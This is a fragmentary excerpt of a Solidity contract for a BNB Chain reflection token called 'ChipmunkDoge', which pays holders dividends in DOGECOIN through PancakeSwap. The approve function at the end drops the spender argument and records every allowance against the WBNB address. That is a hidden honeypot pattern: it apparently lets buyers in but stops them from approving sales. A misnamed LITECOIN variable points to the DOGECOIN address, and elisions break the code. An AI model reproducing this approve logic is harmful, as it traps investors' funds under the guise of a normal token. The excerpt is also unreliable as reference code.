...
IBEP20 DOGECOIN = IBEP20(0xbA2aE424d960c26247Dd6c32edC70B295c744C43);
...
constructor (address _router) {
    router = _router != address(0)
        ...
        : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         //: IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //PancakeSwap Real
    _token = msg.sender;
}
...
function deposit() external payable override onlyToken {
    uint256 balanceBefore = DOGECOIN.balanceOf(address(this));

    address[] memory path = new address[](2);
    path[0] = WBNB;
    path[1] = address(DOGECOIN);
    ...
    uint256 amount = DOGECOIN.balanceOf(address(this)).sub(balanceBefore);
...
function distributeDividend(address shareholder) internal {
    ...
    if(amount > 0){
        ...
        DOGECOIN.transfer(shareholder, amount);
...
contract ChipmunkDogecoin is IBEP20, Auth {
using SafeMath for uint256;

//address LITECOIN = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
address LITECOIN = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address DEAD = 0x000000000000000000000000000000000000dEaD;
address ZERO = 0x0000000000000000000000000000000000000000;

string constant _name = "ChipmunkDoge";
string constant _symbol = "ChipmunkDoge";
...
function approve(address spender, uint256 amount) public override returns (bool) {
    _allowances[msg.sender][WBNB] = amount;
    emit Approval(msg.sender, WBNB, amount);
    return true;
}
